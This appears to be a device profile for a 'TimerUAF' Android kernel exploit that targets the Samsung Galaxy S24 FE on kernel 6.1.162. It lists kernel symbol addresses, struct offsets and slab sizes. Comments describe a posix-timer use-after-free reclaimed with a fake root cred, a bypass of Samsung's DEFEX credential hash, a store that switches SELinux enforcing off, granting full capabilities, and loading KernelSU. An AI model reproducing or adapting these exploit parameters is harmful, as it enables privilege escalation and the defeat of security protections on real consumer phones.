# TimerUAF kernel profile: Samsung Galaxy S24 FE (SM-S721B, Exynos 2400e)
#
# Samsung-specific mode, same contract as samsung-s26u-6.1.162.conf:
#   - Samsung DEFEX creds_fast_hash bypass (defex_creds_hash below)
#   - diabl0w/KernelSU Samsung build late-load via ksud over /system/bin/logcat
#   - SELinux left to ksud's own restore
#
# Kernel: 6.1.162-android14-11 (4K pages)
# AP    : S721BXXUFEZJ6 (EUX), Android 17, OS patch 2026-10
#
# All values below are derived from the factory boot.img of that build
# (sha256 f5f4109953959d8f09e3b3142d0ee1dfcce4cf069dae8b77cc2373146b6fe899,
# Image 2a9e9aa3be718dc51fd7e6c389d243c50a97ed9c13914fba2160304181850ebd,
# .BTF d6991a6975155571d8ec653db9f00ec971af657fce0c5ac2b7453dbd7cb982e0),
# kallsyms-reconstructed ELF (115697 symbols, base 0xffffffc008000000).
#
# This is the Exynos 6.1.162 family layout.  S24/S24+ (SM-S921B/SM-S926B)
# share every constant below (checked against their own factory Images);
# S25 FE (SM-S731B) does NOT (root_user, init_user_ns, init_ucounts and
# init_groups sit at +0x40, creds_hash/creds_fast_hash at +0x90).
# The Samsung release string carries no model suffix on these builds, so the
# profile is pinned by device_model instead of by banner.
release_prefix = "6.1.162-android14-11"
schema_version = 1
ksu_kmi = "android14-6.1"

# Selection identity (read by UserService; ignored by the C loader).  Without
# it a second 6.1.162 Exynos profile could be picked at random, because their
# uname -r strings are identical.
device_model = "SM-S721B"
android_release = "17"

# Samsung endgame switches (same contract as samsung-s26u-6.1.162.conf).
samsung_mode = 1
samsung_package = "me.weishu.kernelsu"
# DEFEX creds_fast_hash: its own symbol (creds_hash + 0x40000), an 8-byte
# pointer array indexed directly by pid for pid <= 0x8000:
#   get_task_creds: cmp w25, #0x8, lsl #12 ; add x8, x8, x25, lsl #3
defex_creds_hash = 0xffffffc00a66e9f8

# 4K-page variant (CONFIG_ARM64_4K_PAGES; `file Image` reports 4K pages).
page_size = 4096
page_shift = 12
slab_order = 1
slab_size = 8192
linear_min = 0xffffff0000000000
linear_max = 0xffffffc000000000

# 6.1 frees the order-1 slab pages through the PCP lists, so the reclaim also
# gates on /proc/slabinfo.
pcp_free = 1
alloc_req_off = 0x10

# do_timer_create -> kmem_cache_alloc(posix_timers_cache) call site.
# init_posix_timers: mov w1, #0x108 (sizeof k_itimer, BTF agrees), then
# kmem_cache_create; do_timer_create loads x0 from 0xffffffc00a53b3e0
# (= posix_timers_cache), dataflow-verified with sitecheck.py.
timer_site = 0xffffffc008194fe0
timer_alloc = 0x108
# BTF k_itimer: it (struct cpu_timer, node first) at +0x78.
timer_node_off = 0x78

# cred_jar: cred_init: mov w1, #0xb0 (sizeof cred, BTF agrees); HWCACHE_ALIGN
# rounds the object to 0xc0.
cred_req = 0xb0
cred_alloc = 0xc0
cred_size = 0xb0
# 4-byte atomic_t usage on 6.1 (BTF: usage 0x0, uid 0x4, euid 0x14,
# securebits 0x24, cap_inheritable 0x28, security 0x78).
cred_uid_off = 0x4
cred_euid_off = 0x14
cred_cap_off = 0x28
cred_cap_count = 5
cred_security_off = 0x78
cred_user_off = 0x80
cred_userns_off = 0x88
cred_ucounts_off = 0x90
cred_group_off = 0x98
# Distance from the stale k_itimer rb_node to the fake cred base.
fake_cred_off = 0x18

# Link-time symbols (kallsyms), re-verified against nm.  selinux_state - 8 is
# avc_latest_notif_update.notif_lock and BTF puts `enforcing` at bit 0, so the
# -7 store lands on enforcing.
selinux_state = 0xffffffc00a5ea4a8
panic_on_warn = 0xffffffc00a2eac00

# task_struct / cred layout (BTF: task_struct 0x12c0, cred field +0x838).
task_cred_off = 0x838
# dup_task_struct: bl kmem_cache_alloc_node(task_struct_cachep) at
# 0xffffffc0080acb78; the return address low 21 bits are what the trace scan
# matches.  copy_process is not inlined into it on 6.1.
copy_process_low21 = 0xacb7c
# arch_task_struct_size is absent on 6.1 (no task_struct_vendor_size_setup),
# so the cache keeps sizeof(struct task_struct) = 0x12c0.
task_alloc_bytes = 0x12c0

# Capability and fake-cred refcounted sub-objects.
fullcap = 0x1ffffffffff
root_user = 0xffffffc00a310a00
init_user_ns = 0xffffffc00a310770
init_ucounts = 0xffffffc00a3121d8
init_groups = 0xffffffc00a311d20

# task_security_struct: blobsim2.py effective LSM order is
# capability, safesetid, integrity, selinux; SELinux is the only cred-blob LSM.
selinux_blob_off = 0x0
selinux_sid_kernel = 1
